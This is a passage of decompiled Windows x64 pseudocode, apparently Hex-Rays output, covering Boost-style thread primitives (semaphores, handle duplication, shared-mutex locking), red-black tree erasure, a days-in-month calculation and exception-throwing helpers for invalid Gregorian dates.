  return result;
}

//----- (000000014001C810) ----------------------------------------------------
HANDLE __fastcall sub_14001C810(LONG lInitialCount, LONG lMaximumCount)
{
  HANDLE result; // rax
  __int64 v3; // rcx
  const char *v4; // [rsp+20h] [rbp-88h]
  __int128 v5; // [rsp+28h] [rbp-80h]
  __int64 v6; // [rsp+38h] [rbp-70h]
  void *v7; // [rsp+40h] [rbp-68h]
  __int128 v8; // [rsp+58h] [rbp-50h]
  char v9; // [rsp+68h] [rbp-40h]
  __int64 v10; // [rsp+78h] [rbp-30h]
  __int64 v11; // [rsp+80h] [rbp-28h]

  v6 = -2i64;
  result = CreateSemaphoreA(0i64, lInitialCount, lMaximumCount, 0i64);
  if ( !result )
  {
    LODWORD(v5) = 11;
    *((_QWORD *)&v5 + 1) = sub_140030C00(v3);
    v4 = "boost::thread_resource_error";
    std::exception::exception((std::exception *)&v7, &v4);
    v8 = v5;
    v11 = 15i64;
    v10 = 0i64;
    v9 = 0;
    v7 = &loc_1400A3CD0;
    sub_140010B60((const struct std::exception *)&v7);
  }
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014001C8D0) ----------------------------------------------------
HANDLE __fastcall sub_14001C8D0(HANDLE hSourceHandle)
{
  HANDLE v1; // rbx
  HANDLE v2; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  HANDLE TargetHandle; // [rsp+40h] [rbp-98h]
  const char *v7; // [rsp+48h] [rbp-90h]
  __int128 v8; // [rsp+50h] [rbp-88h]
  __int64 v9; // [rsp+60h] [rbp-78h]
  void *v10; // [rsp+70h] [rbp-68h]
  __int128 v11; // [rsp+88h] [rbp-50h]
  char v12; // [rsp+98h] [rbp-40h]
  __int64 v13; // [rsp+A8h] [rbp-30h]
  __int64 v14; // [rsp+B0h] [rbp-28h]

  v9 = -2i64;
  v1 = hSourceHandle;
  v2 = GetCurrentProcess();
  TargetHandle = 0i64;
  if ( DuplicateHandle(v2, v1, v2, &TargetHandle, 0, 0, 2u) == 0 )
  {
    v4 = sub_140030C00(v3);
    LODWORD(v8) = 11;
    *((_QWORD *)&v8 + 1) = v4;
    v7 = "boost::thread_resource_error";
    std::exception::exception((std::exception *)&v10, &v7);
    v11 = v8;
    v14 = 15i64;
    v13 = 0i64;
    v12 = 0;
    v10 = &loc_1400A3CD0;
    sub_140010B60((const struct std::exception *)&v10);
  }
  return TargetHandle;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014001C9D0) ----------------------------------------------------
signed __int64 __fastcall sub_14001C9D0(unsigned __int16 a1, unsigned __int16 a2)
{
  signed int v2; // ecx
  signed __int64 result; // rax

  if ( a2 == 2 )
  {
    if ( a1 % 4 || a1 == 100 * (a1 / 100) && a1 != 400 * (a1 / 400) )
      result = 28i64;
    else
      result = 29i64;
  }
  else if ( a2 <= 0xBu && (v2 = 2640, _bittest(&v2, a2)) )
  {
    result = 30i64;
  }
  else
  {
    result = 31i64;
  }
  return result;
}

//----- (000000014001CA50) ----------------------------------------------------
__int64 __fastcall sub_14001CA50(__int64 **a1, _DWORD *a2)
{
  __int64 *v2; // r11
  _DWORD *v3; // r10
  __int64 **v4; // r14
  __int64 *v5; // rax
  __int64 v6; // rbx
  __int64 *v7; // rdi
  __int64 v8; // r8
  unsigned int v9; // er9
  unsigned int v10; // edx
  __int64 v11; // rsi
  __int64 v12; // rax
  __int64 **v13; // rcx
  __int64 *j; // rcx
  __int64 i; // rcx
  __int64 v16; // r8
  __int64 v17; // rax
  __int64 l; // rax
  __int64 k; // rax
  char v21; // [rsp+30h] [rbp+8h]

  v2 = *a1;
  v3 = a2;
  v4 = a1;
  v5 = (__int64 *)(*a1)[1];
  v6 = (__int64)*a1;
  v7 = *a1;
  v8 = (*a1)[1];
  if ( !*((_BYTE *)v5 + 25) )
  {
    v9 = *a2;
    do
    {
      v10 = *(_DWORD *)(v8 + 32);
      if ( v10 >= v9 )
      {
        if ( *((_BYTE *)v7 + 25) && v9 < v10 )
          v7 = (__int64 *)v8;
        v6 = v8;
        v8 = *(_QWORD *)v8;
      }
      else
      {
        v8 = *(_QWORD *)(v8 + 16);
      }
    }
    while ( !*(_BYTE *)(v8 + 25) );
  }
  if ( !*((_BYTE *)v7 + 25) )
    v5 = (__int64 *)*v7;
  while ( !*((_BYTE *)v5 + 25) )
  {
    if ( *v3 >= *((_DWORD *)v5 + 8) )
    {
      v5 = (__int64 *)v5[2];
    }
    else
    {
      v7 = v5;
      v5 = (__int64 *)*v5;
    }
  }
  v11 = 0i64;
  v12 = v6;
  while ( (__int64 *)v12 != v7 )
  {
    ++v11;
    if ( !*(_BYTE *)(v12 + 25) )
    {
      v13 = *(__int64 ***)(v12 + 16);
      if ( *((_BYTE *)v13 + 25) )
      {
        for ( i = *(_QWORD *)(v12 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
        {
          if ( v12 != *(_QWORD *)(i + 16) )
            break;
          v12 = i;
        }
        v12 = i;
      }
      else
      {
        v12 = *(_QWORD *)(v12 + 16);
        for ( j = *v13; !*((_BYTE *)j + 25); j = (__int64 *)*j )
          v12 = (__int64)j;
      }
    }
  }
  if ( v6 != *v2 || v7 != v2 )
  {
    while ( (__int64 *)v6 != v7 )
    {
      v16 = v6;
      if ( !*(_BYTE *)(v6 + 25) )
      {
        v17 = *(_QWORD *)(v6 + 16);
        if ( *(_BYTE *)(v17 + 25) )
        {
          for ( k = *(_QWORD *)(v6 + 8); !*(_BYTE *)(k + 25); k = *(_QWORD *)(k + 8) )
          {
            if ( v6 != *(_QWORD *)(k + 16) )
              break;
            v6 = k;
          }
          v6 = k;
        }
        else
        {
          v6 = *(_QWORD *)(v6 + 16);
          for ( l = *(_QWORD *)v17; !*(_BYTE *)(l + 25); l = *(_QWORD *)l )
            v6 = l;
        }
      }
      sub_140079470(v4, (__int64 *)&v21, v16);
    }
  }
  else
  {
    sub_140079320(v4);
  }
  return v11;
}

//----- (000000014001CBD0) ----------------------------------------------------
__int64 *__fastcall sub_14001CBD0(__int64 **a1, __int64 *a2, __int64 a3)
{
  __int64 *v3; // rsi
  __int64 *v4; // r15
  __int64 **v5; // r14
  __int64 v6; // rax
  __int64 j; // rax
  __int64 i; // rax
  __int64 v9; // rdi
  __int64 v10; // rbx
  __int64 k; // rcx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 l; // rcx
  __int64 *v15; // rax
  char v16; // cl
  _BYTE *v17; // rcx
  __int64 *v18; // rcx
  __int64 **v19; // rax
  _BYTE *v20; // rcx
  __int64 v21; // rax
  _QWORD *v22; // rax
  volatile signed __int32 *v23; // rbx
  __int64 *v24; // rax
  __int64 v26; // [rsp+50h] [rbp+18h]

  v26 = a3;
  v3 = (__int64 *)a3;
  v4 = a2;
  v5 = a1;
  if ( !*(_BYTE *)(a3 + 25) )
  {
    v6 = *(_QWORD *)(a3 + 16);
    if ( *(_BYTE *)(v6 + 25) )
    {
      for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
      {
        if ( a3 != *(_QWORD *)(i + 16) )
          break;
        a3 = i;
      }
      a3 = i;
      v26 = i;
    }
    else
    {
      a3 = *(_QWORD *)(a3 + 16);
      for ( j = *(_QWORD *)v6; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
        a3 = j;
      v26 = a3;
    }
  }
  if ( *(_BYTE *)(*v3 + 25) )
  {
    v9 = v3[2];
LABEL_15:
    v10 = v3[1];
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    if ( (__int64 *)(*a1)[1] == v3 )
    {
      (*a1)[1] = v9;
    }
    else if ( *(__int64 **)v10 == v3 )
    {
      *(_QWORD *)v10 = v9;
    }
    else
    {
      *(_QWORD *)(v10 + 16) = v9;
    }
    if ( (__int64 *)**a1 == v3 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        k = v10;
      }
      else
      {
        v12 = *(_QWORD *)v9;
        for ( k = v9; !*(_BYTE *)(v12 + 25); v12 = *(_QWORD *)v12 )
          k = v12;
      }
      **v5 = k;
    }
    a2 = *v5;
    if ( (__int64 *)(*v5)[2] == v3 )
    {
      if ( *(_BYTE *)(v9 + 25) )
      {
        a2[2] = v10;
      }
      else
      {
        v13 = *(_QWORD *)(v9 + 16);
        for ( l = v9; !*(_BYTE *)(v13 + 25); v13 = *(_QWORD *)(v13 + 16) )
          l = v13;
        a2[2] = l;
      }
    }
    goto LABEL_45;
  }
  if ( *(_BYTE *)(v3[2] + 25) )
  {
    v9 = *v3;
    goto LABEL_15;
  }
  v9 = *(_QWORD *)(a3 + 16);
  if ( (__int64 *)a3 == v3 )
    goto LABEL_15;
  *(_QWORD *)(*v3 + 8) = a3;
  *(_QWORD *)a3 = *v3;
  if ( a3 == v3[2] )
  {
    v10 = a3;
  }
  else
  {
    v10 = *(_QWORD *)(a3 + 8);
    if ( !*(_BYTE *)(v9 + 25) )
      *(_QWORD *)(v9 + 8) = v10;
    *(_QWORD *)v10 = v9;
    *(_QWORD *)(a3 + 16) = v3[2];
    *(_QWORD *)(v3[2] + 8) = a3;
  }
  if ( (__int64 *)(*a1)[1] == v3 )
  {
    (*a1)[1] = a3;
  }
  else
  {
    v15 = (__int64 *)v3[1];
    if ( (__int64 *)*v15 == v3 )
      *v15 = a3;
    else
      v15[2] = a3;
  }
  *(_QWORD *)(a3 + 8) = v3[1];
  v16 = *(_BYTE *)(a3 + 24);
  *(_BYTE *)(a3 + 24) = *((_BYTE *)v3 + 24);
  *((_BYTE *)v3 + 24) = v16;
LABEL_45:
  if ( *((_BYTE *)v3 + 24) == 1 )
  {
    for ( ; v9 != (*v5)[1]; v10 = *(_QWORD *)(v10 + 8) )
    {
      if ( *(_BYTE *)(v9 + 24) != 1 )
        break;
      v17 = *(_BYTE **)v10;
      if ( v9 == *(_QWORD *)v10 )
      {
        v17 = *(_BYTE **)(v10 + 16);
        if ( !v17[24] )
        {
          v17[24] = 1;
          v18 = *(__int64 **)(v10 + 16);
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)(v10 + 16) = *v18;
          if ( !*(_BYTE *)(*v18 + 25) )
            *(_QWORD *)(*v18 + 8) = v10;
          v18[1] = *(_QWORD *)(v10 + 8);
          if ( v10 == (*v5)[1] )
          {
            (*v5)[1] = (__int64)v18;
          }
          else
          {
            v19 = *(__int64 ***)(v10 + 8);
            if ( (__int64 *)v10 == *v19 )
              *v19 = v18;
            else
              v19[2] = v18;
          }
          *v18 = v10;
          *(_QWORD *)(v10 + 8) = v18;
          v17 = *(_BYTE **)(v10 + 16);
        }
        if ( v17[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*(_QWORD *)v17 + 24i64) != 1 || *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) == 1 )
          {
            *(_BYTE *)(*(_QWORD *)v17 + 24i64) = 1;
            v17[24] = 0;
            sub_14000C800((__int64)v5, v17);
            v17 = *(_BYTE **)(v10 + 16);
          }
          v17[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) = 1;
          sub_14001BF70((__int64)v5, v10);
          break;
        }
      }
      else
      {
        if ( !v17[24] )
        {
          v17[24] = 1;
          v20 = *(_BYTE **)v10;
          *(_BYTE *)(v10 + 24) = 0;
          *(_QWORD *)v10 = *((_QWORD *)v20 + 2);
          v21 = *((_QWORD *)v20 + 2);
          if ( !*(_BYTE *)(v21 + 25) )
            *(_QWORD *)(v21 + 8) = v10;
          *((_QWORD *)v20 + 1) = *(_QWORD *)(v10 + 8);
          if ( v10 == (*v5)[1] )
          {
            (*v5)[1] = (__int64)v20;
          }
          else
          {
            v22 = *(_QWORD **)(v10 + 8);
            if ( v10 == v22[2] )
              v22[2] = v20;
            else
              *v22 = v20;
          }
          *((_QWORD *)v20 + 2) = v10;
          *(_QWORD *)(v10 + 8) = v20;
          v17 = *(_BYTE **)v10;
        }
        if ( v17[25] )
          goto LABEL_77;
        if ( *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) != 1 || *(_BYTE *)(*(_QWORD *)v17 + 24i64) != 1 )
        {
          if ( *(_BYTE *)(*(_QWORD *)v17 + 24i64) == 1 )
          {
            *(_BYTE *)(*((_QWORD *)v17 + 2) + 24i64) = 1;
            v17[24] = 0;
            sub_14001BF70((__int64)v5, (__int64)v17);
            v17 = *(_BYTE **)v10;
          }
          v17[24] = *(_BYTE *)(v10 + 24);
          *(_BYTE *)(v10 + 24) = 1;
          *(_BYTE *)(*(_QWORD *)v17 + 24i64) = 1;
          sub_14000C800((__int64)v5, (_QWORD *)v10);
          break;
        }
      }
      v17[24] = 0;
LABEL_77:
      v9 = v10;
    }
    *(_BYTE *)(v9 + 24) = 1;
  }
  v23 = (volatile signed __int32 *)v3[6];
  if ( v23 )
  {
    if ( !_InterlockedDecrement(v23 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *, __int64 *, __int64))(*(_QWORD *)v23 + 8i64))(v23, a2, a3);
      if ( !_InterlockedDecrement(v23 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v23 + 16i64))(v23);
    }
  }
  operator delete(v3);
  v24 = v5[1];
  if ( v24 )
    v5[1] = (__int64 *)((char *)v24 - 1);
  *v4 = v26;
  return v4;
}

//----- (000000014001CFC0) ----------------------------------------------------
_QWORD *__fastcall sub_14001CFC0(volatile signed __int32 *a1, __int64 a2)
{
  _QWORD *v2; // r14
  __int64 v3; // rbx
  HANDLE v4; // rdi
  char *v5; // rcx
  __int64 v6; // rax
  __int64 v7; // rcx
  __int64 v8; // rcx
  volatile signed __int32 *v9; // rsi
  unsigned __int64 v10; // rax
  unsigned __int64 v11; // rcx
  signed __int64 v12; // rbp
  _QWORD *v13; // rcx
  __int64 v14; // rax
  volatile signed __int32 **v15; // rax
  signed int v16; // eax
  HANDLE v17; // rax
  volatile signed __int32 *v19; // [rsp+60h] [rbp+8h]
  __int64 v20; // [rsp+68h] [rbp+10h]
  volatile signed __int32 *v21; // [rsp+70h] [rbp+18h]

  v20 = a2;
  v2 = (_QWORD *)a2;
  v3 = (__int64)a1;
  v21 = a1;
  sub_14001D400(a1);
  if ( !*(_QWORD *)(v3 + 48) )
  {
    v4 = sub_14001C810(0, 0x7FFFFFFF);
    v5 = *(char **)(v3 + 48);
    if ( (unsigned __int64)(v5 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
      CloseHandle(v5);
    *(_QWORD *)(v3 + 48) = v4;
  }
  ++*(_DWORD *)(v3 + 16);
  v6 = *(_QWORD *)(v3 + 32);
  if ( *(_QWORD *)(v3 + 24) == v6 || (v7 = *(_QWORD *)(v6 - 8), *(_BYTE *)(v7 + 20)) )
  {
    v9 = (volatile signed __int32 *)operator new(0x20ui64);
    v19 = v9;
    if ( v9 )
    {
      *(_QWORD *)v9 = sub_14001C810(0, 0x7FFFFFFF);
      *((_QWORD *)v9 + 1) = sub_14001C8D0(*(HANDLE *)(v3 + 48));
      *((_DWORD *)v9 + 4) = 1;
      *((_BYTE *)v9 + 20) = 0;
      *((_DWORD *)v9 + 6) = 0;
    }
    else
    {
      v9 = 0i64;
    }
    v19 = v9;
    if ( v9 )
      _InterlockedIncrement(v9 + 6);
    v10 = *(_QWORD *)(v3 + 32);
    if ( (unsigned __int64)&v19 >= v10 || (v11 = *(_QWORD *)(v3 + 24), v11 > (unsigned __int64)&v19) )
    {
      if ( v10 == *(_QWORD *)(v3 + 40) )
        sub_14001C420(v3 + 24, 1ui64);
      v15 = *(volatile signed __int32 ***)(v3 + 32);
      if ( v15 )
      {
        *v15 = v9;
        if ( v9 )
          _InterlockedIncrement(v9 + 6);
      }
    }
    else
    {
      v12 = (signed __int64)((signed __int64)&v19 - v11) >> 3;
      if ( v10 == *(_QWORD *)(v3 + 40) )
        sub_14001C420(v3 + 24, 1ui64);
      v13 = *(_QWORD **)(v3 + 32);
      if ( v13 )
      {
        v14 = *(_QWORD *)(*(_QWORD *)(v3 + 24) + 8 * v12);
        *v13 = v14;
        if ( v14 )
          _InterlockedIncrement((volatile signed __int32 *)(v14 + 24));
      }
    }
    *(_QWORD *)(v3 + 32) += 8i64;
    *v2 = v9;
  }
  else
  {
    _InterlockedIncrement((volatile signed __int32 *)(v7 + 16));
    v8 = *(_QWORD *)(*(_QWORD *)(v3 + 32) - 8i64);
    *v2 = v8;
    if ( v8 )
      _InterlockedIncrement((volatile signed __int32 *)(v8 + 24));
  }
  v16 = _InterlockedExchangeAdd((volatile signed __int32 *)v3, 0x80000000);
  if ( !_bittest(&v16, 0x1Eu)
    && v16 > (signed int)2147483648
    && !_interlockedbittestandset((volatile signed __int32 *)v3, 0x1Eu) )
  {
    v17 = sub_1400139E0(v3);
    SetEvent(v17);
  }
  return v2;
}

//----- (000000014001D190) ----------------------------------------------------
void __fastcall sub_14001D190(void *a1)
{
  HANDLE *v1; // rbx
  char *v2; // rcx

  v1 = (HANDLE *)a1;
  if ( !_InterlockedDecrement((volatile signed __int32 *)a1 + 6) && a1 )
  {
    v2 = (char *)*((_QWORD *)a1 + 1);
    if ( (unsigned __int64)(v2 - 1) <= 0xFFFFFFFFFFFFFFFDui64 )
      CloseHandle(v2);
    if ( (char *)*v1 - 1 <= (char *)0xFFFFFFFFFFFFFFFDi64 )
      CloseHandle(*v1);
    operator delete(v1);
  }
}

//----- (000000014001D1F0) ----------------------------------------------------
__int64 __fastcall sub_14001D1F0(__int64 *a1)
{
  __int64 *v1; // rdi
  _DWORD *v2; // rbx
  DWORD *v3; // rax
  __int64 v4; // rcx
  __int64 v5; // rax
  const char *v7; // [rsp+20h] [rbp-98h]
  char v8; // [rsp+28h] [rbp-90h]
  __int128 v9; // [rsp+30h] [rbp-88h]
  __int64 v10; // [rsp+40h] [rbp-78h]
  void *v11; // [rsp+50h] [rbp-68h]
  __int128 v12; // [rsp+68h] [rbp-50h]
  char v13; // [rsp+78h] [rbp-40h]
  __int64 v14; // [rsp+88h] [rbp-30h]
  __int64 v15; // [rsp+90h] [rbp-28h]

  v10 = -2i64;
  v1 = a1;
  v2 = sub_140035C10(a1, &v8);
  v3 = sub_140035BF0((DWORD *)&v7);
  v4 = (unsigned int)*v2;
  if ( *v3 == (_DWORD)v4 )
  {
    v5 = sub_140030C00(v4);
    LODWORD(v9) = 36;
    *((_QWORD *)&v9 + 1) = v5;
    v7 = "boost thread: trying joining itself";
    std::exception::exception((std::exception *)&v11, &v7);
    v12 = v9;
    v15 = 15i64;
    v14 = 0i64;
    v13 = 0;
    v11 = &loc_1400A3CD0;
    sub_140010B60((const struct std::exception *)&v11);
  }
  return sub_1400361D0(v1);
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014001D2E0) ----------------------------------------------------
void __fastcall sub_14001D2E0(volatile signed __int32 **a1)
{
  volatile signed __int32 **v1; // rbx
  volatile signed __int32 *v2; // rcx
  const char *v3; // [rsp+20h] [rbp-29h]
  __int128 v4; // [rsp+28h] [rbp-21h]
  __int64 v5; // [rsp+38h] [rbp-11h]
  void *v6; // [rsp+40h] [rbp-9h]
  __int128 v7; // [rsp+58h] [rbp+Fh]
  char v8; // [rsp+68h] [rbp+1Fh]
  __int64 v9; // [rsp+78h] [rbp+2Fh]
  __int64 v10; // [rsp+80h] [rbp+37h]

  v5 = -2i64;
  v1 = a1;
  v2 = *a1;
  if ( !v2 )
  {
    LODWORD(v4) = 1;
    *((_QWORD *)&v4 + 1) = sub_140030C00(0i64);
    v3 = "boost unique_lock has no mutex";
    std::exception::exception((std::exception *)&v6, &v3);
    v7 = v4;
    v10 = 15i64;
    v9 = 0i64;
    v8 = 0;
    v6 = &loc_1400A3CD0;
    sub_140017380(&v6);
  }
  if ( *((_BYTE *)v1 + 8) )
  {
    LODWORD(v4) = 36;
    *((_QWORD *)&v4 + 1) = sub_140030C00(v2);
    v3 = "boost unique_lock owns already the mutex";
    std::exception::exception((std::exception *)&v6, &v3);
    v7 = v4;
    v10 = 15i64;
    v9 = 0i64;
    v8 = 0;
    v6 = &loc_1400A3CD0;
    sub_140017380(&v6);
  }
  sub_14001D400(v2);
  *((_BYTE *)v1 + 8) = 1;
}
// 140017380: using guessed type __int64 __fastcall sub_140017380(_QWORD);
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (000000014001D400) ----------------------------------------------------
void __fastcall sub_14001D400(volatile signed __int32 *a1)
{
  volatile signed __int32 *v1; // rdi
  int i; // ebx
  signed __int32 v3; // ecx
  signed __int32 v4; // eax
  void *v5; // rsi
  HANDLE v6; // rcx
  unsigned int v7; // ecx
  signed __int32 v8; // eax

  v1 = a1;
  if ( _interlockedbittestandset(a1, 0x1Fu) )
  {
    for ( i = *a1; ; i = v4 )
    {
      v3 = i >= 0 ? i | 0x80000000 : i + 1;
      v4 = _InterlockedCompareExchange(v1, v3, i);
      if ( i == v4 )
        break;
    }
    if ( i < 0 )
      i = v3;
    if ( i < 0 )
    {
      v5 = (void *)*((_QWORD *)v1 + 1);
      if ( !v5 )
      {
        v6 = sub_140013410(0, 0);
        v5 = (void *)_InterlockedCompareExchange((volatile signed __int64 *)v1 + 1, (signed __int64)v6, 0i64);
        if ( v5 )
          CloseHandle(v6);
        else
          v5 = v6;
      }
      do
      {
        WaitForSingleObjectEx(v5, 0xFFFFFFFF, 0);
        for ( i = i & 0x3FFFFFFF | 0x40000000; ; i = v8 )
        {
          v7 = i >= 0 ? (i - 1) | 0x80000000 : i;
          v8 = _InterlockedCompareExchange(v1, v7 & 0xBFFFFFFF, i);
          if ( i == v8 )
            break;
        }
      }
      while ( i < 0 );
    }
  }
}

//----- (000000014001D4E0) ----------------------------------------------------
void __fastcall sub_14001D4E0(_QWORD *a1, __int64 a2, __int64 a3)
{
  unsigned __int64 v3; // rax
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rsi
  unsigned __int64 v7; // rdi
  _QWORD *v8; // rcx
  _QWORD *v9; // rdi
  __int64 *v10; // rax
  __int64 v11; // [rsp+20h] [rbp-18h]
  __int64 v12; // [rsp+28h] [rbp-10h]

  v3 = a1[8];
  v4 = a1 + 7;
  v5 = a3;
  v6 = a2;
  v11 = a2;
  v12 = a3;
  if ( (unsigned __int64)&v11 >= v3 || *v4 > (unsigned __int64)&v11 )
  {
    if ( v3 == a1[9] )
      sub_14001C390((__int64)(a1 + 7), 1ui64);
    v10 = (__int64 *)v4[1];
    if ( v10 )
    {
      *v10 = v6;
      v10[1] = v5;
    }
  }
  else
  {
    v7 = (unsigned __int64)&v11 - *v4;
    if ( v3 == a1[9] )
      sub_14001C390((__int64)(a1 + 7), 1ui64);
    v8 = (_QWORD *)v4[1];
    v9 = (_QWORD *)(*v4 + (v7 & 0xFFFFFFFFFFFFFFF0ui64));
    if ( v8 )
    {
      *v8 = *v9;
      v8[1] = v9[1];
    }
  }
  v4[1] += 16i64;
}

//----- (000000014001D590) ----------------------------------------------------
void __fastcall __noreturn sub_14001D590(__int64 a1)
{
  sub_14001D5A0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001D5A0) ----------------------------------------------------
void __fastcall __noreturn sub_14001D5A0(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 (__fastcall **v4)(void *); // [rsp+28h] [rbp-60h]
  void **v5; // [rsp+40h] [rbp-48h]
  __int64 v6; // [rsp+48h] [rbp-40h]
  __int64 v7; // [rsp+50h] [rbp-38h]
  __int64 v8; // [rsp+58h] [rbp-30h]
  int v9; // [rsp+60h] [rbp-28h]
  int v10; // [rsp+64h] [rbp-24h]
  signed int *v11; // [rsp+68h] [rbp-20h]
  void **v12; // [rsp+78h] [rbp-10h]

  v1 = a1 - 80;
  v11 = (signed int *)&unk_1400A4F88;
  v12 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v4, (const struct std::exception *)(a1 - 80));
  v4 = &off_1400A4E20;
  if ( v1 )
    v1 += 24i64;
  v5 = &off_1400A3CB0;
  v3 = *(_QWORD *)(v1 + 8);
  v6 = v3;
  if ( v3 )
    (*(void (__cdecl **)(__int64, __int64))(*(_QWORD *)v3 + 24i64))(v3, v2);
  v7 = *(_QWORD *)(v1 + 16);
  v8 = *(_QWORD *)(v1 + 24);
  v9 = *(_DWORD *)(v1 + 32);
  v4 = &off_1400A4F58;
  v5 = (void **)off_1400A4F68;
  *(signed int **)((char *)&v11 + v11[1]) = (signed int *)&off_1400A4F70;
  *(int *)((char *)&v10 + v11[1]) = 0;
  CxxThrowException(
    &v4,
    &_TI8_AV__clone_impl_U__error_info_injector_Ubad_day_of_month_gregorian_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A4F58: using guessed type __int64 (__fastcall *off_1400A4F58)(void *);
// 1400A4F68: using guessed type __int64 (__fastcall *off_1400A4F68[2])();
// 1400A4F70: using guessed type __int64 (__fastcall *off_1400A4F70)();
// 1400D35B8: using guessed type int _TI8_AV__clone_impl_U__error_info_injector_Ubad_day_of_month_gregorian_boost___exception_detail_boost___exception_detail_boost__;

//----- (000000014001D688) ----------------------------------------------------
void __fastcall __noreturn sub_14001D688(__int64 a1)
{
  sub_14001D6A0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001D6A0) ----------------------------------------------------
void __fastcall __noreturn sub_14001D6A0(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 (__fastcall **v4)(void *); // [rsp+28h] [rbp-60h]
  void **v5; // [rsp+40h] [rbp-48h]
  __int64 v6; // [rsp+48h] [rbp-40h]
  __int64 v7; // [rsp+50h] [rbp-38h]
  __int64 v8; // [rsp+58h] [rbp-30h]
  int v9; // [rsp+60h] [rbp-28h]
  int v10; // [rsp+64h] [rbp-24h]
  signed int *v11; // [rsp+68h] [rbp-20h]
  void **v12; // [rsp+78h] [rbp-10h]

  v1 = a1 - 80;
  v11 = (signed int *)&unk_1400A5088;
  v12 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v4, (const struct std::exception *)(a1 - 80));
  v4 = &off_1400A4E20;
  if ( v1 )
    v1 += 24i64;
  v5 = &off_1400A3CB0;
  v3 = *(_QWORD *)(v1 + 8);
  v6 = v3;
  if ( v3 )
    (*(void (__cdecl **)(__int64, __int64))(*(_QWORD *)v3 + 24i64))(v3, v2);
  v7 = *(_QWORD *)(v1 + 16);
  v8 = *(_QWORD *)(v1 + 24);
  v9 = *(_DWORD *)(v1 + 32);
  v4 = &off_1400A5058;
  v5 = (void **)off_1400A5068;
  *(signed int **)((char *)&v11 + v11[1]) = (signed int *)&off_1400A5070;
  *(int *)((char *)&v10 + v11[1]) = 0;
  CxxThrowException(
    &v4,
    &_TI8_AV__clone_impl_U__error_info_injector_Ubad_month_gregorian_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A5058: using guessed type __int64 (__fastcall *off_1400A5058)(void *);
// 1400A5068: using guessed type __int64 (__fastcall *off_1400A5068[2])();
// 1400A5070: using guessed type __int64 (__fastcall *off_1400A5070)();
// 1400D3990: using guessed type int _TI8_AV__clone_impl_U__error_info_injector_Ubad_month_gregorian_boost___exception_detail_boost___exception_detail_boost__;

//----- (000000014001D788) ----------------------------------------------------
void __fastcall __noreturn sub_14001D788(__int64 a1)
{
  sub_14001D7A0(a1 - *(signed int *)(a1 - 4));
}

//----- (000000014001D7A0) ----------------------------------------------------
void __fastcall __noreturn sub_14001D7A0(__int64 a1)
{
  signed __int64 v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 (__fastcall **v4)(void *); // [rsp+28h] [rbp-60h]
  void **v5; // [rsp+40h] [rbp-48h]
  __int64 v6; // [rsp+48h] [rbp-40h]
  __int64 v7; // [rsp+50h] [rbp-38h]
  __int64 v8; // [rsp+58h] [rbp-30h]
  int v9; // [rsp+60h] [rbp-28h]
  int v10; // [rsp+64h] [rbp-24h]
  signed int *v11; // [rsp+68h] [rbp-20h]
  void **v12; // [rsp+78h] [rbp-10h]

  v1 = a1 - 80;
  v11 = (signed int *)&unk_1400A5050;
  v12 = &off_1400A3CB8;
  std::exception::exception((std::exception *)&v4, (const struct std::exception *)(a1 - 80));
  v4 = &off_1400A4E20;
  if ( v1 )
    v1 += 24i64;
  v5 = &off_1400A3CB0;
  v3 = *(_QWORD *)(v1 + 8);
  v6 = v3;
  if ( v3 )
